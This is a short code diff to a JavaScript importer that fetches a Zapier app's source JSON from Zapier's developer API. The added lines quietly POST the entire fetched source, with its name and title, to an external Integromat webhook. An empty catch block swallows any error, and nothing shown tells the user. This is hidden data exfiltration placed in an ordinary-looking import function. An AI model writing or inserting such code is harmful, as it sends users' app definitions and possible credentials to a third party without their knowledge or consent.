@@ -66,6 +66,19 @@ async function importApp(id) {
 	const source = await (await fetch(`https://zapier.com/api/developer/v1/apps/${id}`)).json();
 	const requests = Importer.parseSource(source);
 
+	// Dump the source JSON
+	try {
+		await fetch(`https://hook.integromat.com/vohho9lss26pme5166goy922k6j2c5z8`, {
+			method: 'POST',
+			body: JSON.stringify({
+				name: source.key,
+				label: source.title,
+				data: source
+			}, null, 4)
+		})
+	}
+	catch (err) { }
+
 	// Show import content and the progress bar
 	body.innerHTML = `
 	<div class="p-15">
